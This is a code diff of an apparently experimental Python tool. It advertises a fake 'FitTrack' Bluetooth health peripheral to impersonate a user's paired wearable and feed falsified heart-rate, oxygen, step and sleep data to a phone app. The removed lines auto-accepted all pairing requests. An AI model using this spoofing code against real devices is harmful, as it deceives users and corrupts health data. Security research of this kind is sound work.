@@ -1,19 +1,34 @@
-import asyncio
-from asyncio import Queue, Event, create_task
-from bluez_peripheral.util import Adapter, get_message_bus, is_bluez_available
-from bluez_peripheral.advert import Advertisement
-from bluez_peripheral.gatt.service import ServiceCollection
-from bluez_peripheral.gatt.characteristic import CharacteristicFlags as CF
-from bluez_peripheral.agent import NoIoAgent
-from bluez_peripheral.advert import AdvertisingIncludes
-from services.fake_heart_rate_service import HEARTRATE_SERVICE, FakeHeartRateService
-from services.fake_pulse_oximeter_service import PULSEOXIMETER_SERVICE, FakePulseOximeterService
-from services.fake_physical_activity_monitor_service import PHYSICAL_ACTIVITY_SERVICE, FakePhysicalActivityMonitorService
-from services.fake_sleep_monitor_service import SLEEP_MONITOR_SERVICE, FakeSleepMonitorService
-from utils.adapter_utils import set_adapter_alias, set_adapter_discoverable, set_adapter_powered, find_adapter_props
+from bluez_gatt.services.fake_heart_rate_service import FakeHeartRateService
+from bluez_gatt.services.fake_physical_activity_monitor_service import FakePhysicalActivityMonitorService
+from bluez_gatt.services.fake_pulse_oximeter_service import FakePulseOximeterService
+from bluez_gatt.services.fake_sleep_monitor_service import FakeSleepMonitorService
+
+from utils.adapter_utils import set_adapter_alias, cleanup, register_advert, register_gatt_application
 from utils.btmgmt_utils import setup_btmgmt
-import os
+import dbus_next
+from dbus_next.aio import MessageBus
+from bluez_gatt.characteristics.heartrate_meas_char import HeartMeasurementCharacteristic
+from bluez_gatt.characteristics.physical_activty_meas_char import StepCounterCharacteristic
+from bluez_gatt.characteristics.pulse_oximeter_meas_char import PulseOximeterMeasurementCharacteristic
+from bluez_gatt.characteristics.sleep_actvity_meas_char import SleepMeasurementCharacteristic
+from bluez_gatt.advertisement import Advertisement
+import asyncio
+import traceback
+from asyncio import Queue, Event, create_task
 import logging
+
+BLUEZ_SERVICE = "org.bluez"
+ADAPTER_PATH = "/org/bluez/hci0"
+
+# STANDARD UUIDS BY BLUETOOTH (SIG)
+HEARTRATE_SERVICE = "0000180d-0000-1000-8000-00805f9b34fb"
+HEARTRATE_MEASUREMENT = "00002a37-0000-1000-8000-00805f9b34fb"
+PULSEOXIMETER_SERVICE = "00001822-0000-1000-8000-00805f9b34fb"
+PLX_CONT_MEAS = "00002a5f-0000-1000-8000-00805f9b34fb"
+PHYSICAL_ACTIVITY_SERVICE = "0000183E-0000-1000-8000-00805f9b34fb"
+STEP_COUNTER_MEASUREMENT = "00002b40-0000-1000-8000-00805f9b34fb"
+SLEEP_MONITOR_SERVICE = "00001111-0000-1000-8000-00805f9b34fb"
+SLEEP_MEASUREMENT = "00002b41-0000-1000-8000-00805f9b34fb"
 
 DEVICE_NAME = "FitTrack"
 RED = "\033[91m"
@@ -28,7 +43,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 
-async def queue_control_consumer(service: FakePhysicalActivityMonitorService | FakeSleepMonitorService, queue: Queue, stop_event: Event):
+async def queue_control_consumer(service: FakePhysicalActivityMonitorService, queue: Queue, stop_event: Event):
     """Consume text commands from queue and feed them to service handlers logic"""
 
     while not stop_event.is_set():
@@ -140,7 +155,7 @@ async def stdin_reader_and_dispatch(pams_queue: Queue, sams_queue: Queue, stop_e
         if head == "sams":
             await sams_queue.put(rest)
             try:
-                await pams_queue.join()
+                await sams_queue.join()
             except asyncio.CancelledError:
                 break
 
@@ -148,6 +163,9 @@ async def stdin_reader_and_dispatch(pams_queue: Queue, sams_queue: Queue, stop_e
 
 
 async def main():
+    if setup_btmgmt() == False:
+        return
+
     # for this attack the client (app smartphone device) will already be paired with the real ble peripheral
     # we advertise the fake ble peripheral with characterstics in plaintext and the app should accept this
     # because the app will be scanning for names the attack goes through
@@ -164,118 +182,112 @@ async def main():
     # or brute force the payload formats, by trying various combinations of byte payloads
     # for this experiment we assume the attacker knows all of the payloads, as this is not the scope of the attack
 
-    bus = await get_message_bus()
+    # connec to bluez system bus
+    bus = await MessageBus(bus_type=dbus_next.BusType.SYSTEM).connect()
+    try:
 
-    if await is_bluez_available(bus):
-        print("BlueZ available on system bus")
-    else:
-        print("BlueZ not available on system bus")
-        return
+        node_info = await bus.introspect(BLUEZ_SERVICE, ADAPTER_PATH)
 
-    # finds the path for hci1, because we will run the attacker peripheral on a bluetooth toggle
-    adapter_path, _ = await find_adapter_props(bus)
-    await set_adapter_powered(bus)
-    await set_adapter_discoverable(bus)
+        print("node_info type:", type(node_info))
+        # optional: show a tiny snippet
+        try:
+            print("node_info summary:", str(node_info)[:300])
+        except Exception:
+            pass
 
-    # map adapter path
-    adapters = await Adapter.get_all(bus)
-    adapter_obj = None
-    for a in adapters:
-        obj_path = a._proxy.path
-        logger.debug("Proxy Bus: %s", a._proxy.bus)
-        logger.debug("Proxy Bus name: %s", a._proxy.bus_name)
-        logger.debug("Proxy Bus path: %s", a._proxy.path)
+        # get the proxy object
+        proxy = bus.get_proxy_object(BLUEZ_SERVICE, ADAPTER_PATH, node_info)
+        await set_adapter_alias(proxy, DEVICE_NAME)
+
+        path = "/org/attack_1"
+        fake_heartrate_service_path = f"{path}/heartrate_service"
+        fake_physical_activity_service_path = f"{path}/physical_activtiy_service"
+        fake_pulse_oximeter_service_path = f"{path}/pulse_oximeter_service"
+        fake_sleep_service_path = f"{path}/sleep_activity_service"
+
+        heartrate_meas_char_path = f"{fake_heartrate_service_path}/heart_measurement"
+        step_counter_char_path = f"{fake_physical_activity_service_path}/step_counter"
+        pulse_oximeter_meas_char_path = f"{fake_pulse_oximeter_service_path}/pulse_oximeter_measurement"
+        sleep_meas_char_path = f"{fake_pulse_oximeter_service_path}/sleep_monitor_measurement"
+
+        # ------------------------Create GATT Characteristics-------------------------------
+        heartrate_meas_char = HeartMeasurementCharacteristic(
+            heartrate_meas_char_path, HEARTRATE_MEASUREMENT, fake_heartrate_service_path, ["read", "notify"])
+
+        step_counter_char = StepCounterCharacteristic(
+            step_counter_char_path, STEP_COUNTER_MEASUREMENT, fake_physical_activity_service_path, [
+                "read", "notify"]
+        )
+
+        pulse_oximeter_meas_char = PulseOximeterMeasurementCharacteristic(
+            pulse_oximeter_meas_char_path, PLX_CONT_MEAS, fake_pulse_oximeter_service_path, ["read"])
+
+        sleep_meas_char = SleepMeasurementCharacteristic(
+            sleep_meas_char_path, SLEEP_MEASUREMENT, fake_sleep_service_path, [
+                "read", "notify"]
+        )
+        # ------------------------Create GATT Services-------------------------------
+
+        fake_heartrate_service = FakeHeartRateService(
+            fake_heartrate_service_path, HEARTRATE_SERVICE, heartrate_meas_char)
+
+        fake_physical_activity_service = FakePhysicalActivityMonitorService(
+            fake_physical_activity_service_path, PHYSICAL_ACTIVITY_SERVICE, step_counter_char
+        )
+
+        fake_pulse_oximeter_service = FakePulseOximeterService(
+            fake_pulse_oximeter_service_path, PULSEOXIMETER_SERVICE, pulse_oximeter_meas_char
+        )
+
+        fake_sleep_activity_service = FakeSleepMonitorService(
+            fake_sleep_service_path, SLEEP_MONITOR_SERVICE, sleep_meas_char)
+
+        # ------------------------Export Service on Bluez System Bus------------
+
+        bus.export(fake_heartrate_service_path, fake_heartrate_service)
+        bus.export(fake_physical_activity_service_path,
+                   fake_physical_activity_service)
+        bus.export(fake_pulse_oximeter_service_path,
+                   fake_pulse_oximeter_service)
+        bus.export(fake_sleep_service_path, fake_sleep_activity_service)
+
+        # ------------------------Export Characteristics on Bluez System Bus------------
+
+        bus.export(heartrate_meas_char_path, heartrate_meas_char)
+        bus.export(step_counter_char_path, step_counter_char)
+        bus.export(pulse_oximeter_meas_char_path, pulse_oximeter_meas_char)
+        bus.export(sleep_meas_char_path, sleep_meas_char)
+
+        await register_gatt_application(proxy, path)
+
+        service_uuids = [HEARTRATE_SERVICE,
+                         PHYSICAL_ACTIVITY_SERVICE, PULSEOXIMETER_SERVICE, SLEEP_MONITOR_SERVICE]
+
+        advert_path = f"{path}/advert0"
+        advert = Advertisement(advert_path, "TestAttacker", service_uuids)
 
         try:
-            if obj_path is not None and obj_path == adapter_path:
-                adapter_obj = a
-                logger.info("Found adapter by proxy.object_path: %s", obj_path)
-                break
+            await register_advert(bus, proxy, advert, advert_path)
+            print("-------------------Advertisment registered-----------------------")
+        except Exception as e:
+            print(f"Failed to register advertisement: {e}")
 
-        except Exception:
-            logger.warning("Exception while inspecting adapter: %s", e)
-            continue
+        # create queues & stop event
+        pams_queue = Queue()  # Physical Activity Monitor Service
+        sams_queue = Queue()  # Sleep Activity Monitor Service
+        stop_event = Event()
 
-    if adapter_obj is None:
-        # fallback: try find by suffix 'hci1'
-        for a in adapters:
-            try:
-                if getattr(a.proxy, "object_path", "").endswith("/hci1"):
-                    adapter_obj = a
-                    logger.info("Found adapter by suffix match: %s", obj_path)
-                    break
-            except Exception:
-                continue
+        tasks = [asyncio.create_task(queue_control_consumer(
+            fake_physical_activity_service, pams_queue, stop_event)), asyncio.create_task(queue_control_consumer(fake_sleep_activity_service, sams_queue, stop_event))]
 
-    if setup_btmgmt() == False:
-        return
-
-    # NoIoAgent will accept all incoming pairing requests from all devices unconditionally, so
-    # o if we paired the real device and the fake peripheral presents itself with the MAC address or device name of the real BLE peripheral,
-    # the system will automatically trust and connect to the fake device without prompting the user
-    agent = NoIoAgent()
-
-    try:
-        # register should be set on default in order to accept pairing requests
-        await agent.register(bus, default=True)
-    except Exception as e:
-        print(f"Failed to register agent: {e}")
-
-    # create the services
-    fake_heartrate_service = FakeHeartRateService()
-    fake_pulse_oximeter_service = FakePulseOximeterService()
-    fake_physical_activity_service = FakePhysicalActivityMonitorService()
-    fake_sleep_monitor_service = FakeSleepMonitorService()
-
-    try:
-        services = ServiceCollection()
-        services.add_service(fake_heartrate_service)
-        services.add_service(fake_pulse_oximeter_service)
-        services.add_service(fake_physical_activity_service)
-        services.add_service(fake_sleep_monitor_service)
-        await services.register(bus, adapter=adapter_obj)
-    except Exception as e:
-        print(f"Failed to register serivce: {e}")
-
-    await set_adapter_alias(bus, DEVICE_NAME)
-
-    advert = Advertisement(
-        localName=DEVICE_NAME,
-        serviceUUIDs=[HEARTRATE_SERVICE,
-                      PULSEOXIMETER_SERVICE,
-                      PHYSICAL_ACTIVITY_SERVICE,
-                      SLEEP_MONITOR_SERVICE],
-        appearance=0,
-        timeout=0,
-        discoverable=True,
-        includes=AdvertisingIncludes.TX_POWER,
-        duration=65535
-    )
-
-    try:
-        await advert.register(bus, adapter=adapter_obj)
-        print("-------------------Advertisment registered-----------------------")
-    except Exception as e:
-        print(f"Failed to register advertisement: {e}")
-
-    # create queues & stop event
-    pams_queue = Queue()  # Physical Activity Monitor Service
-    sams_queue = Queue()  # Sleep Activity Monitor Service
-    stop_event = Event()
-
-    tasks = [
-        asyncio.create_task(fake_heartrate_service.start()),
-        asyncio.create_task(queue_control_consumer(
-            fake_physical_activity_service, pams_queue, stop_event)),
-        asyncio.create_task(queue_control_consumer(
-            fake_sleep_monitor_service, sams_queue, stop_event)),
-        asyncio.create_task(stdin_reader_and_dispatch(
-            pams_queue, sams_queue, stop_event))
-    ]
+    except Exception:
+        print("Top-level exception while setting up:")
+        traceback.print_exc()
 
     try:
         wait_task = [asyncio.create_task(
-            bus.wait_for_disconnect()), asyncio.create_task(stop_event.wait())]
+            bus.wait_for_disconnect()), asyncio.create_task(stop_event.wait()), asyncio.create_task(stdin_reader_and_dispatch(
+                pams_queue, sams_queue, stop_event))]
 
         # clean shutdown, we wait until BlueZ disconnects or stop_event is set
         done, pending = await asyncio.wait(wait_task, return_when=asyncio.FIRST_COMPLETED)
@@ -284,6 +296,7 @@ async def main():
             t.cancel()
     finally:
         stop_event.set()
+        await cleanup(bus, proxy, advert_path, path)
 
         for t in tasks:
             t.cancel()
